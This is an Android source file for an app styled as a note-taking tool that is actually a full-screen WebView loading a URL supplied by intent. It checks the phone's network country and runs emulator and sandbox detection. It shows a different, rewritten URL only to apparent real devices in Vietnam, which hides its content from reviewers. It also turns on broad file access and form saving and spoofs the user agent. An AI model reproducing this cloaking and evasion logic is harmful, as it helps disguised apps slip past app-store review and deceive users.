package noteapp.hinkuan.quicknote2610;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.view.WindowManager;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.io.File;
import java.util.Locale;


public class NoteAppW extends AppCompatActivity {

    WebView web;
    String url, newUrl,isCheckConnected;

    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN
                , WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.activity_note_app_w);

        web = findViewById(R.id.westApp);
        Intent intent = getIntent();
        url = intent.getStringExtra("link");
        isCheckConnected=intent.getStringExtra("isCheckConnected");

        web.getSettings().setJavaScriptEnabled(true);
        this.web.setWebViewClient(new WebViewClient());
        this.web.getSettings().setDomStorageEnabled(true);
        this.web.getSettings().setLoadWithOverviewMode(true);
        this.web.getSettings().setJavaScriptEnabled(true);
        this.web.getSettings().setSaveFormData(true);
        this.web.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onCreateWindow(WebView view, boolean isDialog, boolean isUserGesture, Message resultMsg) {
                WebView webView = new WebView(view.getContext());
                webView.setWebViewClient(new WebViewClient());
                webView.getSettings().setDomStorageEnabled(true);
                webView.getSettings().setLoadWithOverviewMode(true);
                webView.getSettings().setJavaScriptEnabled(true);
                webView.getSettings().setSaveFormData(true);
                webView.getSettings().setAllowFileAccess(true);
                webView.getSettings().setAllowFileAccess(true);
                webView.getSettings().setAllowContentAccess(true);
                webView.getSettings().setSupportMultipleWindows(true);
                webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
                webView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
                webView.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36");
                webView.setWebViewClient(new WebViewClient() {
                    @Override
                    public boolean shouldOverrideUrlLoading(WebView view, String url) {
                        web.loadUrl(url);
                        return true;

                    }
                });
                ((WebView.WebViewTransport) resultMsg.obj).setWebView(webView);
                resultMsg.sendToTarget();
                return true;
            }
        });
        this.web.getSettings().setAllowFileAccess(true);
        this.web.getSettings().setAllowFileAccess(true);
        this.web.getSettings().setAllowContentAccess(true);
        this.web.getSettings().setSupportMultipleWindows(true);
        this.web.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        this.web.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        this.web.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36");

        //kiểm tra vùngcủa sdt
        TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        String mv = tm.getNetworkCountryIso();
        String tmt = tm.getNetworkOperatorName().toLowerCase();
        if ((mv.equals("vn") || mv.equals("VN") && !isCheck(tmt) && isCheckConnected.equals("true") )) {
            newUrl = url.replace("ht", "https");
            this.web.loadUrl(newUrl);
        } else {
            this.web.loadUrl(url);
        }
    }


    @Override
    public void onBackPressed() {
        if (web.canGoBack()) {
            web.goBack();
        } else {
//            super.onBackPressed();
            finishAffinity();
        }
    }
    public static boolean isCheck(String mv) {
        try {
            String buildDetails = (Build.FINGERPRINT + Build.DEVICE + Build.MODEL + Build.BRAND + Build.PRODUCT + Build.MANUFACTURER + Build.HARDWARE).toLowerCase(Locale.getDefault());
            if (buildDetails.contains("generic")
                    || buildDetails.contains("unknown")
                    || buildDetails.contains("emulator")
                    || buildDetails.contains("sdk")
                    || buildDetails.contains("genymotion")
                    || buildDetails.contains("x86") // this includes vbox86
                    || buildDetails.contains("goldfish")
                    || buildDetails.contains("test-keys")) {
                return true;
            }
        } catch (Throwable t) {
        }
        try {
            if ("android".equals(mv)) {
                return true;
            }
        } catch (Throwable t) {
        }
        try {
            if (new File("/init.goldfish.rc").exists()) {
                return true;
            }
        } catch (Throwable t) {
        }
        return false;
    }
}